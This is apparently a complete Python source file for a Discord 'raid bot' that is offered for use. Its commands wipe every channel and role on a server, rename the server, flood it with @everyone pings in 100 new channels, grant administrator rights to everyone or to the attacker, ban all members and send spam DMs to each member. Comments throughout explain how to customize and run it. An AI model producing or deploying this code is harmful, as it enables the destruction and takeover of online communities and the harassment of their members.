import time
import asyncio
from itertools import cycle
from dotenv import load_dotenv
from os import path, getenv

from discord import Intents, Permissions, Activity, ActivityType, Embed, Role
from discord.ext.commands import Bot
from discord.ext.tasks import loop
from discord_webhook import DiscordWebhook, DiscordEmbed

load_dotenv(path.join('.', '.env'))  # Load data from the .env file

intents = Intents.default()
intents.members = True
# Intents are important for this, do not touch anything here.
client = Bot(command_prefix="!", intents=intents, help_command=None)
client_status = cycle([  # Put the custom status of the bot in this list, separated by quotes and ,
    Activity(type=ActivityType.listening,
             name="Customize your own status here"),
])


@client.event
async def on_ready():  # Every time that the bots turns on, will show this Ascii Art, if you want to use a custom Ascii art just change it, but let in inside of the triple quotes.
    anarchy = r"""
    ██████╗ ██╗   ██╗███╗   ██╗██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗     ███████╗ ██████╗ ██╗   ██╗ █████╗ ██████╗ 
    ██╔══██╗██║   ██║████╗  ██║██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗    ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔══██╗
    ██████╔╝██║   ██║██╔██╗ ██║█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║    ███████╗██║   ██║██║   ██║███████║██║  ██║
    ██╔═══╝ ██║   ██║██║╚██╗██║██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║    ╚════██║██║▄▄ ██║██║   ██║██╔══██║██║  ██║
    ██║     ╚██████╔╝██║ ╚████║██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██████╔╝    ███████║╚██████╔╝╚██████╔╝██║  ██║██████╔╝
    ╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝     ╚══════╝ ╚══▀▀═╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                                                                                    Raidbot by: Crowley
    """
    print(anarchy)
    change_status.start()


def administrator_permissions():
    permissions = Permissions()
    permissions.update(administrator=True)
    return permissions


@client.event
# This event sends spam to every channel created.
async def on_guild_channel_create(channel):
    y = 0
    # Use the logic, the name of the spam channels and this conditional must be the same, or the bot won't work.
    if channel.name == "server-punkwned":
        while y < 15:
            # The spam message, you can use your own custom message.
            await channel.send("||@everyone|| Server Punkwned:\nhttps://discord.gg/FhJydrmbTz")
            y += 1


@loop(minutes=2)
async def change_status():
    _activity = next(client_status)
    await client.change_presence(activity=_activity)


# Help menu with the default name of the commands, it's up to you change the names and adjust this crap.
@client.command(name="ayuda", description="Menú de ayuda del bot.")
async def ayuda_command(ctx):
    user = ctx.message.author
    embed = Embed(
        title="Command list of Arpaviejas",
        description="Detailed description about what this bot can do at the moment",
        colour=0xebe300
    )
    x = 0
    for command in client.all_commands.keys():
        command = client.all_commands[command]
        embed.add_field(name=f"{client.command_prefix}{command.name}",
                        value=command.description, inline=bool(x % 2))
        x += 1
    await ctx.send(embed=embed)


# Eskorbuto Command, if you want to use a custom image, just put the document in the same folder.
@client.command(name="eskorbuto", description="Changes the name and the icon of the server, also deletes all the channels and starts to make spam creating new channels with pings.")
async def eskorbuto_command(ctx):
    # Once you got the image that you want to use, just change the name of the file and the extension if needed, must be on the same folder of the bot file, but you can put a full path to image file.
    with open('anarchism.jpg', 'rb') as f:
        icon = f.read()
    # Here's the new server name, change the name if you want.
    await ctx.guild.edit(name="Server Punkwned by Anarchists", icon=icon)
    try:
        for channels in client.get_all_channels():
            await channels.delete()
    except:
        print(f"Error, i can't delete the channel {channels}")
    # 2 Seconds of delay before the next action, just to avoid limitations with the requests or errors.
    await asyncio.sleep(2)
    x = 0
    while x < 100:
        await ctx.guild.create_text_channel("server-punkwned")
        x += 1


@client.command(name="kaotiko", description="This command deletes all the roles of the server above the bot's role and creates 50 new roles.")
async def kaotiko_command(ctx):
    for guild in client.guilds:
        for roles in guild.roles:
            # Bot tries to remove his own role for some reason, so i put this, change the Arpaviejas name to your bot name.
            if roles.name != "@everyone" or roles.name != "@Arpaviejas":
                try:
                    await roles.delete()
                except:
                    print(
                        f"Error, i can't delete the role {roles}, maybe i'm above of that role.")
    z = 0
    while z < 50:
        # Again, roles name can be changed and the colour.
        await ctx.guild.create_role(name="Punks Are Here!", colour=0xebe300)
        z += 1


@client.command(name="herejia", description="We must have equity, so this shit will give Admin privileges to the @everyone role.")
async def herejia_command(ctx):
    for guild in client.guilds:
        for role in guild.roles:
            if role.name == "@everyone":
                await role.edit(reason=None, permissions=administrator_permissions())


# The Panda command, you can change the Punk Role name and the colour, don't forgot to use "0x" before the Hex range
@client.command(name="panda", description="If you're an oppresor and son of a bitch, this crap will give you an special role with privileges. **WARNING: OTHER USERS CAN USE THIS, UNLESS YOU ADD AN EQUALITY CHECK TO CONFIRM YOUR USER ID.**")
async def panda_command(ctx):
    user = ctx.message.author
    role = await ctx.guild.create_role(name="Punk", colour=0xebe300, permissions=administrator_permissions())
    await user.add_roles(role)


@client.command(name="flema", description="Do you want to get the invite of the bot and take a look to the bad practices of the creator?, use this command.")
async def flema_command(ctx):
    user = ctx.message.author
    await user.send("Here's my invite:\nhttps://discord.com/oauth2/authorize?client_id=870548494082002944&scope=bot&permissions=8\nDo you want to take a look to the bad practices of the creator of this bot?, here's the official Github Repo:https://github.com/PuppetCrowley/Arpaviejas\n")


@client.command(name="elektroduendes", description="Works for ban all users, has some bugs due the Discord rate limit")
async def elektroduendes_command(ctx):
    for users in ctx.guild.members:
        # Bot won't ban you using this command, because the != is going to check if the users are different from the message.author (The person that puts the command).
        if users != ctx.message.author:
            try:
                await users.ban()
            except:
                print(
                    f"I can't ban {users}, Maybe i'm above of his role or he's the owner of the server.")


@client.command(name="glorificator", description="type !glorificar + role-name to give admin privileges to some role.")
async def glorificar_command(ctx, role: Role, *, reason=None):
    try:
        await role.edit(permissions=administrator_permissions(), reason=reason)
    except:
        print(
            f"Error, i can't edit the role {role}, Maybe i'm above of this role or it's somehow protected.")


@client.command(name="dazepunk", description="This will send a single DM Message to all the users in the server, except the command author.")
async def dazepunk_command(ctx):
    for users in ctx.guild.members:
        # The bot will not send you any DM with this command using this conditional.
        if users != ctx.message.author:
            try:
                await users.send(f"The server {ctx.guild.name} has been fucked by Punks:\nhttps://discord.gg/FhJydrmbTz")
            except:
                print(
                    f"Error, i can't send a message to the user {users}, maybe he locked the DM Access.")


@client.command(name="millencolin", description="This command combines !eskorbuto, !kaotiko and !herejia at the same time, use this crap if you value your time. (Yeah sure, value your time raiding discord servers)")
async def millencolin_command(ctx):
    await eskorbuto_command(ctx)
    await kaotiko_command(ctx)
    await herejia_command(ctx)

client.run(getenv('BOT_TOKEN'))  # Put your Bot Token here.
